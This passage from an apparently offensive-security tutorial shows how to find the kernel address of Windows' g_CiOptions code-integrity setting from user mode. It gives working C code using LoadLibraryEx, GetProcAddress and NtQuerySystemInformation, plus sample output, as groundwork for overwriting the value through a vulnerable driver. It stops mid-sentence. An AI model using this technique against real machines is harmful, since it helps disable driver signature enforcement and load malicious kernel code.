You might think that we could get the location of g_CiOptions from userland relatively easily by using LoadLibrary/GetProcAddress to find CI!CiInitialize first, and then take off our offset.  However, userland and kernel memory is split into two dedicated ranges.

For instance, this will return a value like **0x00007FFBC7430130** rather than **0xFFFFF8051D934130**.

```
HMODULE moduleBase = LoadLibraryEx(L"CI.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
FARPROC ciInitialize = GetProcAddress(moduleBase, "CiInitialize");
printf("[+] CI!CiInitialize @ 0x%llp\n", ciInitialize);
```



Visually, we can see the addresses have some similarities - they both end in 130.  In essence, we have the same DLL loaded in two places, at two different base addresses.  But the offset from the module base to CiInitialize is the same in both cases.  To calculate the offset from the CI.dll module base to CiInitialize, we simply subtract one from the other (e.g `ciInitialize - moduleBase`).

Next, we need to find the base address of CI.dll that's already been loaded by the kernel - which can be done with the [NtQuerySystemInformation](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation) API.  The `SYSTEM_INFORMATION_CLASS` that we need is SystemModuleInformation, which is, you guessed it - undocumented.  For the most part, we have to scrape the various struct definitions from resources such as [here](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented Functions%2FSystem Information%2FNtQuerySystemInformation.html) and [here](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/query.htm).

For your sanity, this is what you need:

```
typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemModuleInformation = 11,
} SYSTEM_INFORMATION_CLASS, * PSYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE {
	PVOID   Unknown1;
	PVOID   Unknown2;
	PVOID   Base;
	ULONG   Size;
	ULONG   Flags;
	USHORT  Index;
	USHORT  NameLength;
	USHORT  LoadCount;
	USHORT  PathLength;
	CHAR    ImageName[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[0];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef
NTSTATUS(WINAPI* _NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);
```



We also have to resolve the location of NtQuerySystemInformation at runtime, because Nt* functions are not readily exported in any of the usual userland header files.  The complete method is fairly self-explanatory:

```
PVOID GetModuleBase(LPCSTR moduleName)
{
    // find NtQuerySystemInformation
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    _NtQuerySystemInformation ntQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    // get required buffer size
    ULONG length;
    NTSTATUS status = ntQuerySystemInformation(
        SystemModuleInformation,
        NULL,
        0,
        &length);

    // allocate memory
    PSYSTEM_MODULE_INFORMATION moduleInfo = (PSYSTEM_MODULE_INFORMATION)malloc(length);
    RtlZeroMemory(moduleInfo, length);

    // get module information
    status = ntQuerySystemInformation(
        SystemModuleInformation,
        moduleInfo,
        length,
        &length);

    // iterate over each module
    PVOID pModule = nullptr;
    for (LONG i = 0; i < moduleInfo->ModulesCount; i++)
    {
        if (strstr(moduleInfo->Modules[i].ImageName, moduleName) != NULL)
        {
            printf("[!] %s found @ 0x%llX\n", moduleInfo->Modules[i].ImageName, moduleInfo->Modules[i].Base);
            pModule = moduleInfo->Modules[i].Base;
            break;
        }
    }

    // free memory
    free(moduleInfo);

    return pModule;
}
```



Call it like so:  `PVOID kModuleBase = GetModuleBase("CI.dll");`

We now have all the pieces - we just need to put it all together with the various calculations.

```
PVOID kModuleBase = GetModuleBase("CI.dll");

HMODULE uCi = LoadLibraryEx(L"ci.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
printf("[+] Userland CI.dll @ 0x%llp\n", uCi);

FARPROC uCiInit = GetProcAddress(uCi, "CiInitialize");
printf("[+] Userland CI!CiInitialize @ 0x%llp\n", uCiInit);

ULONG64 ciInitOffset = (ULONG64)uCiInit - (ULONG64)uCi;
printf("[+] CI!CiInitialize offset is 0x%llX\n", ciInitOffset);
        
ULONG64 kCiInit = ((ULONG64)uCiInit - (ULONG64)uCi) + (ULONG64)kModuleBase;
printf("[+] Kernel CI!CiInitialize @ 0x%llX\n", kCiInit);

ULONG64 ciOptions = kCiInit - 0x9418;
printf("[+] g_CiOptions @ 0x%llX\n", ciOptions);
[+] \SystemRoot\system32\CI.dll found @ 0xFFFFF8051D8F4000
[+] Userland CI.dll @ 0x00007FFBC7770000
[+] Userland CI!CiInitialize @ 0x00007FFBC77B0130
[+] CI!CiInitialize offset is 0x40130
[+] Kernel CI!CiInitialize @ 0xFFFFF8051D934130
[+] g_CiOptions @ 0xFFFFF8051D92AD18
```



Now the address is known, it can be used in conjunction with a vulnerable driver to write a new value.  The particulars of how to achieve that depend on the specific exploit being used.  It's also important to note that this area of memory is protected by